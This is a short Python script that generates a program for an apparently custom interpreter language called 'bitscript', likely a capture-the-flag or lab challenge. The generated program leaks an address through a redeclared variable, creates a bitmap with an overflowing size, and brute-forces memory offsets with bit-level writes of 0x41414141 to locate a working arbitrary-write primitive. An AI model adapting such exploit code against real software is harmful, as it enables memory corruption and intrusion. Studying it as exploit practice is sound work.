#!/usr/bin/env python3
"""
Generate bitscript to brute force find correct address offsets
"""

def generate_brute_force_script():
    """Generate script that tries multiple offset combinations"""
    
    script = """print("=== Brute Force Address Finding ===");

int target = 0;
string target = "target";
int targetaddr = target;
print("Target string address:");
print(targetaddr);

print("Creating bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Testing multiple offset combinations...");
print("Writing test value 0x41414141 to each candidate");
print("Then reading back to see which one matches");

"""
    
    # Test different entry offsets
    entry_offsets = [0x100, 0x200, 0x300, 0x400, 0x500, 0x600]
    bitmap_offsets = [-0x1000, -0x2000, -0x3000]
    
    test_value = 0x41414141
    test_bits = []
    for bit in range(32):
        if (test_value >> bit) & 1:
            test_bits.append(bit)
    
    for i, entry_offset in enumerate(entry_offsets):
        for j, bitmap_offset in enumerate(bitmap_offsets):
            test_num = i * len(bitmap_offsets) + j + 1
            
            script += f"""
print("Test {test_num}: entry_offset=-0x{entry_offset:x}, bitmap_offset={bitmap_offset:x}");
int entry{test_num} = targetaddr - {entry_offset};
int valueptr{test_num} = entry{test_num} + 40;
int bitmapptr{test_num} = targetaddr {bitmap_offset:+d};
int offset{test_num} = valueptr{test_num} - bitmapptr{test_num};
int bitindex{test_num} = offset{test_num} * 8;
print("bit_index:");
print(bitindex{test_num});
"""
            
            # Write test value
            for bit in test_bits:
                script += f"set(b1, bitindex{test_num} + {bit}, 0, 1);\n"
            
            script += f"""
int test{test_num} = target;
print("test{test_num}:");
print(test{test_num});
if (test{test_num} == 1094795585) {{
    print("SUCCESS! Found correct offsets!");
    print("entry_offset = -0x{entry_offset:x}");
    print("bitmap_offset = {bitmap_offset:x}");
}}
"""
    
    script += """
print("Brute force test completed");
"""
    
    return script

if __name__ == "__main__":
    script = generate_brute_force_script()
    print(script)

